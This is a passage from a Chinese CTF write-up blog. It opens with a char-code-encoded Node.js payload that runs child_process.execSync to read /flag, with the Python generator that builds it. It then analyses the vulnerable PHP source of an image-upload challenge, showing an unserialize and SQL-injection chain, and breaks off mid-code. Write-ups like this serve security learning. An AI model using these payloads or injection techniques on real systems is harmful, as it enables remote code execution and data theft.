<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>(<span class="hljs-params">cmd</span>):<br>    s = <span class="hljs-string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;,&#x27;</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s])<br><br><span class="hljs-built_in">print</span>(gen(<span class="hljs-string">&#x27;dir&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p>PAYLOAD:</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">Content-Type: application/JSON<br><br>&#123;<br>  &quot;e&quot;: &quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(<span class="hljs-number">114,101,116,117</span>,<span class="hljs-number">114,110,32,112</span>,<span class="hljs-number">114,111,99,101</span>,<span class="hljs-number">115,115,46,109</span>,<span class="hljs-number">97,105,110,77</span>,<span class="hljs-number">111,100,117,108</span>,<span class="hljs-number">101,46,114,101</span>,<span class="hljs-number">113,117,105,114</span>,<span class="hljs-number">101,40,39,99</span>,<span class="hljs-number">104,105,108,100</span>,<span class="hljs-number">95,112,114,111</span>,<span class="hljs-number">99,101,115,115</span>,<span class="hljs-number">39,41,46,101</span>,<span class="hljs-number">120,101,99,83</span>,<span class="hljs-number">121,110,99,40</span>,<span class="hljs-number">39,99,97,116</span>,<span class="hljs-number">32,47,102,108</span>,<span class="hljs-number">97,103,39,41</span>,<span class="hljs-number">46,116,111,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,40,41</span>))()))(Math+<span class="hljs-number">1</span>)&quot;,<br>  &quot;first&quot;: [<span class="hljs-number">0</span>],<br>  &quot;second&quot;: &quot;<span class="hljs-number">0</span>&quot;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>js</code>弱相等？强相等？任意数据类型拼接后是字符串？<code>length</code>属性对于数字是否生效？<code>Function</code>对象？箭头函数自调用？<code>fromCharCode</code>方法？</p>
<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>进去首先是个注册登录界面，根据题目名就没往<code>SQL</code>注入那边想，注册一个用户登录然后上传图片：</p>
<p><img src="/img/qwb2019upload1.png" srcset="/img/loading.gif" lazyload alt="qwb2019upload1"></p>
<p>这里的<code>cookie</code>已经是我解码后的数据(一串序列化后的用户信息)。</p>
<p>奇怪的是不管我怎么上传图片都是显示<code>404</code>。。他妈的可能环境有问题，留着后面再做吧</p>
<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>这题需要找源码，<code>buu</code>上直接给了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//show.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>])&#123;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>] == <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>		<span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Delete_All_Images</span>();<br>	&#125;<br>&#125;<br><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Get_All_Images</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$con</span>;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;con = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$this</span>-&gt;con))&#123; <br>   			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>		    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>())&#123;<br>		    	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br>		    		<span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br>					<span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>				&#125;<br>		        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>		    &#125;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>		    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;<br>		&#125;<br>		<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$this</span>-&gt;con);<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Delete_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DELETE FROM images&quot;</span>;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这部分很可疑，存在反序列化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br>	<span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br>	<span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>				&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//helper.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False; <br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br>	<span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span><br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>=<span class="hljs-string">&quot;file&quot;</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$fileinfo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getfile</span>(<span class="hljs-variable">$input</span>);<br>		<span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;title&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;filename&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;ext&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;ext&#x27;</span>];<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;path&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>		<span class="hljs-variable">$img_ext</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>		<span class="hljs-variable">$my_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">1</span>]);<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$my_ext</span>);<br>		<span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$array</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> == <span class="hljs-number">0</span>)&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br>			<span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);<br>		&#125;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br>		<span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>		<span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>		<span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>		&#125;<br>	    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data</span> || !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>		&#125;<br>		<span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">insert_array</span>(<span class="hljs-variable">$data</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">	</span>&#123;	<br>		<span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con</span>)) <br>		&#123; <br>		    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>		&#125;<br>		<span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>			<span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br>			<span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br>			<span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br>			<span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>		&#125;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br>		<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br>		<span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_insert_id</span>(<span class="hljs-variable">$con</span>);<br>		<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br>			<span class="hljs-keyword">return</span> False;<br>			<span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>		&#125;<br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-comment"># Read some config html</span><br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">view_files</span>(<span class="hljs-variable">$this</span>-&gt;config);<br>	&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里有个序列化：<code>		$array[&quot;attr&quot;] = serialize($my_ext);</code></p>
<p>还有<code>file_get_contents</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br>			<span class="hljs-keyword">return</span> False;<br>			<span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>		&#125;<br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br></code></pre></td></tr></table></figure>

<p>upload.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">helper</span> </span>&#123; <span class="hljs-comment">//继承helper</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_base</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>();<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>)&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>])&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file failed.&quot;</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br>		<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">upload_base</span>();<br>	&#125;<br>&#125;<br><span class="hljs-comment">//new了一个upload然后调用upload_base()，upload继承了helper</span><br></code></pre></td></tr></table></figure>

<p>主要分析<code>helper.php</code>：</p>
<p><code>upload</code> - &gt; <code>getfile</code> - &gt; <code>check</code>，<code>upload</code> - &gt; <code>check</code> -&gt; <code>insert_array</code></p>
<p>序列化和反序列化处理的是图片的长宽。。反序列化<code>__destruct()</code>会调用<code>view_files</code>然后调用<code>file_get_contents</code>。上传时序列化，<code>show</code>时触发反序列化。现在的问题是我要怎么利用这个图片上传修改数据库中的存储的长宽字段去触发<code>show</code>里的反序列化？这里限制了后缀但没限制文件名，这里面是否能<code>SQL</code>注入？</p>
<p>参考<code>https://syunaht.com/p/893436503.html</code></p>
<p>注意这部分：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>			<span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br>			<span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br>			<span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br>			<span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>		&#125;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span 